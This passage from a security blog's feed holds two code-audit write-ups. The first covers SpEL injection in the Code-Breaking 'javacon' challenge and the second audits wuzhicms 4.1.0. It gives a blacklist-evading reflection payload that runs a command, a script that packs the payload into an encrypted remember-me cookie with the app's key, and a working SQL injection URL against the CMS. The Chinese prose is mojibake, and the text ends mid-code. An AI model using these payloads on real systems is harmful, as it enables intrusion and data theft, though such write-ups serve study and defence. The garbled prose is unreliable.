title="æ”»å‡»æ¡ä»¶(æ•æ„Ÿå‡½æ•°)"></a>æ”»å‡»æ¡ä»¶(æ•æ„Ÿå‡½æ•°)</h4><ol><li>ä½¿ç”¨StandardEvaluationContextï¼Œ</li><li>æœªå¯¹è¾“å…¥çš„SpELè¿›è¡Œæ ¡éªŒï¼Œæˆ–æœ‰æ–¹æ³•ç»•è¿‡</li><li>å¯¹è¡¨è¾¾å¼è°ƒç”¨äº†getValue()æˆ–parseExpression()å‡½æ•°æˆ–getAdvanceValueå‡½æ•°ã€‚</li></ol><h4 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h4><ul><li>getValue()ï¼ŒparseExpression()ï¼ŒgetAdvanceValue()</li><li>StandardEvaluationContext()ï¼ŒExpressionParser()ï¼ŒSpelExpressionParser()</li></ul><h4 id="Code-Breaking-javacon"><a href="#Code-Breaking-javacon" class="headerlink" title="Code-Breaking javacon"></a>Code-Breaking javacon</h4><p>ä¸‹è½½æºç </p><p><a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p><p>ä½¿ç”¨å‘½ä»¤è¿è¡Œç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar C:\Users\86177\Desktop\challenge-0.0.1-SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨JD-GUIåç¼–è¯‘(ç›´æ¥ç”¨IDEAåç¼–è¯‘æ˜¯ä¸æˆåŠŸçš„)ï¼Œå¯¼å‡ºåç”¨IDEAæ‰“å¼€</p><p>æŸ¥çœ‹ç›®å½•ç»“æ„ä»¥åŠapplication.ymlæ–‡ä»¶</p><p><img src="/img/spel/s01.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æœ‰spelè¡¨è¾¾å¼è°ƒç”¨çš„ï¼Œä½†æ˜¯ä¹Ÿæœ‰é»‘åå•</p><p>æŸ¥çœ‹MainControlleræ–‡ä»¶</p><p>å¯ä»¥çœ‹åˆ°getAdvanceValueå‡½æ•°(åŠ¨æ€è§£æç”¨æˆ·è¾“å…¥çš„ Spring è¡¨è¾¾å¼ï¼ˆSpELï¼‰å¹¶è¿”å›æ‰§è¡Œç»“æœï¼Œå®ƒåœ¨è§£æå‰ä¼šå¯¹è¾“å…¥å†…å®¹åšé»‘åå•å…³é”®è¯è¿‡æ»¤ï¼Œé˜»æ­¢æ‰§è¡Œå±é™©è¡¨è¾¾å¼)ï¼Œæ­¤å‡½æ•°æ˜¯SpELlæ³¨å…¥æ¼æ´å‡ºå‘ç‚¹</p><p><img src="/img/spel/s02.png"></p><p>æœç´¢å…³é”®å­—getAdvanceValue</p><p>å¯ä»¥çœ‹åˆ°adminæ–¹æ³•ä¸­è‹¥rememberMeValueä¸ä¸ºç©ºï¼Œåˆ™ä¼šå°†æ­¤å€¼åšè§£å¯†å¤„ç†ï¼Œå°†è·å¾—çš„å€¼ä½œä¸ºusernameå±æ€§</p><p>æ­¤æ—¶çš„usernameå¯æ§ï¼Œå¯ä»¥å®ç°SpELæ³¨å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping</span><br><span class="hljs-comment">/*     */</span>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">admin</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;remember-me&quot;, required = false)</span> String rememberMeValue, HttpSession session, Model model)</span> &#123;<br><span class="hljs-comment">/*  36 */</span>     <span class="hljs-keyword">if</span> (rememberMeValue != <span class="hljs-literal">null</span> &amp;&amp; !rememberMeValue.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br><span class="hljs-comment">/*  37 */</span>       <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userConfig.decryptRememberMe(rememberMeValue);<br><span class="hljs-comment">/*  38 */</span>       <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">/*  39 */</span>         session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, str);<br><span class="hljs-comment">/*     */</span>       &#125;<br><span class="hljs-comment">/*     */</span>     &#125; <br><span class="hljs-comment">/*     */</span>     <br><span class="hljs-comment">/*  43 */</span>     <span class="hljs-type">Object</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-comment">/*  44 */</span>     <span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span> || username.toString().equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br><span class="hljs-comment">/*  45 */</span>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/login&quot;</span>;<br><span class="hljs-comment">/*     */</span>     &#125;<br><span class="hljs-comment">/*     */</span>     <br><span class="hljs-comment">/*  48 */</span>     model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>, getAdvanceValue(username.toString()));<br><span class="hljs-comment">/*  49 */</span>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-comment">/*     */</span>   &#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¾“å…¥admin&#x2F;adminå¹¶å‹¾é€‰remember-meé€‰é¡¹,ç‚¹å‡»ç™»å½•ï¼Œç„¶ååœ¨è¯·æ±‚åŒ…ä¸­ä¿®æ”¹Cookieå†…å®¹å³å¯ã€‚</p><p>å…ˆæ„é€ payload</p><p>ç”±äºé»‘åå•çš„é™åˆ¶ï¼Œè¿™é‡Œåˆ©ç”¨javaåå°„æœºåˆ¶è°ƒç”¨æ‰€éœ€ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.la&#x27;</span>+<span class="hljs-string">&#x27;ng.Ru&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRu&#x27;</span>+<span class="hljs-string">&#x27;ntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. <span class="hljs-string">&#x27;&#x27;</span>.getClass() â†’ java.lang.String.class<br>   <span class="hljs-string">&#x27;&#x27;</span> æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œè°ƒç”¨ .getClass() è·å– java.lang.String.class å¯¹è±¡ï¼ˆå³ Class&lt;String&gt;ï¼‰<br>2. forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>) â†’ Runtime.class<br>   åå°„æ–¹å¼åŠ è½½ java.lang.Runtime ç±»ã€‚<br>   ç­‰ä»·äºï¼šClass.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>3. .getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>.getClass()) â†’ è·å– <span class="hljs-built_in">exec</span> æ–¹æ³•<br>   .getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>   è¡¨ç¤ºè·å– Runtime å®ä¾‹çš„ <span class="hljs-built_in">exec</span>(String) æ–¹æ³•ã€‚<br>4. .getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(null) â†’ è·å– Runtime å®ä¾‹<br>   é€šè¿‡è°ƒç”¨é™æ€æ–¹æ³• Runtime.getRuntime() å¾—åˆ°ä¸€ä¸ªè¿è¡Œæ—¶å®ä¾‹:<br>   Runtime runtime=Runtime.getRuntime();<br>   è¿™é‡Œçš„åå°„æ–¹å¼ï¼š.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(null)<br>5. .invoke(..., <span class="hljs-string">&quot;calc&quot;</span>) â†’ æ‰§è¡Œå‘½ä»¤<br>   runtime.exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>   <br>æœ€ç»ˆç­‰ä»·äº Java ä»£ç ï¼šRuntime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>å†å°†å…¶åŠ å¯†ï¼ŒåŠ å¯†ä»£ç åœ¨Encryptor.javaæ–‡ä»¶ä¸­</p><p><img src="/img/spel/s03.png"></p><p>å·²çŸ¥keyæ˜¯c0dehack1nghere1ï¼ŒinitVectoræ˜¯0123456789abcdefï¼Œvalueæ˜¯è¦åŠ å¯†çš„å€¼</p><p>å†™ä¸€ä¸ªåŠ å¯†è„šæœ¬</p><p>å…ˆå°†valueè®¾ç½®ä¸ºadminï¼ŒåŠ å¯†åä¸æ•°æ®åŒ…ä¸­remember-meçš„å€¼æ¯”è¾ƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        String key=<span class="hljs-string">&quot;c0dehack1nghere1&quot;</span>;<br>        String initVector=<span class="hljs-string">&quot;0123456789abcdef&quot;</span>;<br>        String value=<span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-comment">/*    */</span>     <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">/* 15 */</span>       <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(initVector.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-comment">/* 16 */</span>       <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(key.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>), <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 18 */</span>       <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);<br>        <span class="hljs-comment">/* 19 */</span>       cipher.init(<span class="hljs-number">1</span>, skeySpec, iv);<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 21 */</span>       <span class="hljs-type">byte</span>[] encrypted = cipher.doFinal(value.getBytes());<br>        <span class="hljs-comment">/*    */</span><br>        <span class="hljs-comment">/* 23 */</span>       System.out.println(Base64.getUrlEncoder().encodeToString(encrypted));<br>        <span class="hljs-comment">/* 24 */</span>     &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        <span class="hljs-comment">/* 28 */</span>       System.out.println(ex.getMessage());<br>        <span class="hljs-comment">/*    */</span>     &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åŠ å¯†ç»“æœä¸æ•°æ®åŒ…ä¸­å€¼æ˜¯ç›¸åŒçš„ï¼Œè¯´æ˜è„šæœ¬æ²¡æœ‰é—®é¢˜</p><p><img src="/img/spel/s04.png"></p><p><img src="/img/spel/s05.png"></p><p>å°†è„šæœ¬ä¸­valueå€¼æ›´æ”¹ä¸ºpayload</p><p>è¿è¡ŒåæŠ“å–æ•°æ®åŒ…ï¼Œå°†remember-meçš„å€¼æ”¹ä¸ºåŠ å¯†åç»“æœ</p><p>å‘é€æ•°æ®åŒ…ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/spel/s06.png"></p><h4 id="é€šè¿‡SpELæ³¨å…¥å†…å­˜é©¬"><a href="#é€šè¿‡SpELæ³¨å…¥å†…å­˜é©¬" class="headerlink" title="é€šè¿‡SpELæ³¨å…¥å†…å­˜é©¬"></a>é€šè¿‡SpELæ³¨å…¥å†…å­˜é©¬</h4><p><a href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/A_art_xiang/article/details/134370029">Spring-SpELè¡¨è¾¾å¼è¶…çº§è¯¦ç»†ä½¿ç”¨å…¨è§£-CSDNåšå®¢</a></p><p><a href="https://xz.aliyun.com/news/8744">SpELæ³¨å…¥RCEåˆ†æä¸ç»•è¿‡-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a></p><p><a href="https://www.cnblogs.com/qiushuo/p/18393442">https://www.cnblogs.com/qiushuo/p/18393442</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms-4.1.0 ä»£ç å®¡è®¡(php)</title>
    <link href="/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/19/wuzhicms-4.1.0%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>åœ¨www&#x2F;configs&#x2F;default_mysql_config.phpæ›´æ”¹å¯¹åº”é…ç½®ä¿¡æ¯</p><p><img src="/img/wuzhicms/w01.png"></p><p>æ–°å»ºä¸€ä¸ªåä¸ºwuzhicmsçš„æ•°æ®åº“</p><p>æŒ‰ç…§å®‰è£…è¯´æ˜ï¼Œè®¿é—®åŸŸåï¼š<a href="http://åŸŸå/install/">http:&#x2F;&#x2F;åŸŸå&#x2F;install&#x2F;</a> è¿›è¡Œå®‰è£…</p><h3 id="å®¡è®¡è¿‡ç¨‹"><a href="#å®¡è®¡è¿‡ç¨‹" class="headerlink" title="å®¡è®¡è¿‡ç¨‹"></a>å®¡è®¡è¿‡ç¨‹</h3><h4 id="åˆæ­¥"><a href="#åˆæ­¥" class="headerlink" title="åˆæ­¥"></a>åˆæ­¥</h4><h5 id="åˆ¤æ–­è·¯ç”±å…³ç³»"><a href="#åˆ¤æ–­è·¯ç”±å…³ç³»" class="headerlink" title="åˆ¤æ–­è·¯ç”±å…³ç³»"></a>åˆ¤æ–­è·¯ç”±å…³ç³»</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=index&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p>åœ¨coreframe&#x2F;appæ–‡ä»¶å¤¹ä¸­ï¼Œmè¡¨ç¤ºå¯¹åº”çš„æ¨¡å—ï¼Œfè¡¨ç¤ºå¯¹åº”çš„ç±»ï¼Œvè¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•</p><h5 id="ä¼ å€¼æ–¹æ³•"><a href="#ä¼ å€¼æ–¹æ³•" class="headerlink" title="ä¼ å€¼æ–¹æ³•"></a>ä¼ å€¼æ–¹æ³•</h5><p>æ­¤æºç ä¼ å€¼æ˜¯åˆ©ç”¨GLOBALS</p><p><img src="/img/wuzhicms/w10.png"></p><h5 id="å¼•ç”¨æ•°æ®åº“æ¨¡æ¿æ’ä»¶ç­‰-æŸ¥çœ‹å®‰è£…è¯´æ˜"><a href="#å¼•ç”¨æ•°æ®åº“æ¨¡æ¿æ’ä»¶ç­‰-æŸ¥çœ‹å®‰è£…è¯´æ˜" class="headerlink" title="å¼•ç”¨æ•°æ®åº“æ¨¡æ¿æ’ä»¶ç­‰(æŸ¥çœ‹å®‰è£…è¯´æ˜)"></a>å¼•ç”¨æ•°æ®åº“æ¨¡æ¿æ’ä»¶ç­‰(æŸ¥çœ‹å®‰è£…è¯´æ˜)</h5><p>æŸ¥çœ‹cmsè¯´æ˜å¯ä»¥äº†è§£åˆ°æ•°æ®åº“æ˜¯mysql</p><p>ç¿»çœ‹ç›®å½•ç»“æ„å¯ä»¥çœ‹åˆ°æœ‰templetæ–‡ä»¶å¤¹ï¼Œå¯ä»¥å…³æ³¨æ˜¯å¦æœ‰sstiæ³¨å…¥</p><p>åœ¨è¯´æ˜ä¸­çœ‹åˆ°</p><p><img src="/img/wuzhicms/w02.png"></p><p>æºç ä¸­ç¦æ­¢é™„ä»¶ç›®å½•è¿è¡Œphpï¼Œè¯´æ˜å¤§æ¦‚ç‡æ˜¯çˆ†å‡ºè¿‡æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä¸€ä¼šå¯ä»¥å°è¯• .htaccessæ–‡ä»¶é…åˆå›¾ç‰‡é©¬ä¸Šä¼ </p><h5 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h5><p><code>admin/</code> â€” åå°æ§åˆ¶å™¨æˆ–é…ç½®</p><p><code>fields/</code> â€” å­—æ®µç±»å‹å®šä¹‰ä¸å¤„ç†å™¨</p><p><code>libs/</code> â€” æ ¸å¿ƒç±»åº“å’Œå·¥å…·å‡½æ•°</p><h5 id="è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨"><a href="#è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨" class="headerlink" title="è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨"></a>è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨</h5><p>ä¸å¥½ç”¨ï¼Œåªèƒ½è¾…åŠ©</p><p>å…ˆç”¨è‡ªåŠ¨åŒ–å·¥å…·æ‰«æä¸€ä¸‹</p><p><img src="/img/wuzhicms/w03.png"></p><p>æ§åˆ¶ç±»ä¸»è¦åœ¨coreframe&#x2F;appç›®å½•ä¸­ï¼Œç€é‡å…³æ³¨</p><h5 id="æœç´¢æ•æ„Ÿå‡½æ•°å…³é”®å­—"><a href="#æœç´¢æ•æ„Ÿå‡½æ•°å…³é”®å­—" class="headerlink" title="æœç´¢æ•æ„Ÿå‡½æ•°å…³é”®å­—"></a>æœç´¢æ•æ„Ÿå‡½æ•°å…³é”®å­—</h5><p><a href="https://www.cnblogs.com/murkuo/p/15660517.html">phpæ•æ„Ÿå‡½æ•°é€ŸæŸ¥è¡¨ - MuRKuo - åšå®¢å›­ (cnblogs.com)</a></p><h4 id="åå°phpinfo-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#åå°phpinfo-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="åå°phpinfo()æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>åå°phpinfo()æ•æ„Ÿä¿¡æ¯æ³„éœ²</h4><p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php</p><p><img src="/img/wuzhicms/w04.png"></p><p>ç›´æ¥è®¿é—®url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=index&amp;v=phpinfo&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w05.png"></p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>å…¨å±€æœç´¢selectæ—¶å‘ç°coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;mysql.class.phpä¸­</p><p>get_listä¸get_oneæ–¹æ³•æœ‰æœªè¿‡æ»¤çš„sqlè¯­å¥</p><p><img src="/img/wuzhicms/w11.png"></p><p>å…¨å±€æœç´ æ˜¯å¦æœ‰è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥å‚æ•°å¯æ§</p><p>æŸ¥çœ‹æ˜¯å¦èƒ½è®¿é—®</p><h5 id="åå°æ³¨å…¥01"><a href="#åå°æ³¨å…¥01" class="headerlink" title="åå°æ³¨å…¥01"></a>åå°æ³¨å…¥01</h5><p>ç±»ä¼¼çš„listingæ–¹æ³•æœ‰å¾ˆå¤šï¼Œä¸ä¸€ä¸€åˆ—å‡º</p><p>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;copyfrom.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listing</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;copyfrom&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>);<br><span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>        <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;copyfrom_listing&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°keywordså‚æ•°å¯æ§</p><p>æ„é€ urlå°è¯•è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure><p>èƒ½çœ‹åˆ°æ˜¯å‹é“¾æ“ä½œåˆ—è¡¨æŸ¥è¯¢</p><p>æµ‹è¯•ä¸€ä¸‹</p><p><img src="/img/wuzhicms/w12.png"></p><p>çœ‹åˆ°å•å¼•å·æŠ¥é”™ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost/wuzhicms/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=1%25%27+or+1%3dextractvalue(1%2cconcat(0x7e%2c(<span class="hljs-keyword">select</span>+database())))+%23<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©æ³¨å…¥</p><p><img src="/img/wuzhicms/w13.png"></p><h5 id="åå°æ³¨å…¥02"><a href="#åå°æ³¨å…¥02" class="headerlink" title="åå°æ³¨å…¥02"></a>åå°æ³¨å…¥02</h5><p>coreframe&#x2F;app&#x2F;promote&#x2F;admin&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>       <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>       <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>       <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>           <span class="hljs-variable">$where</span> = <span 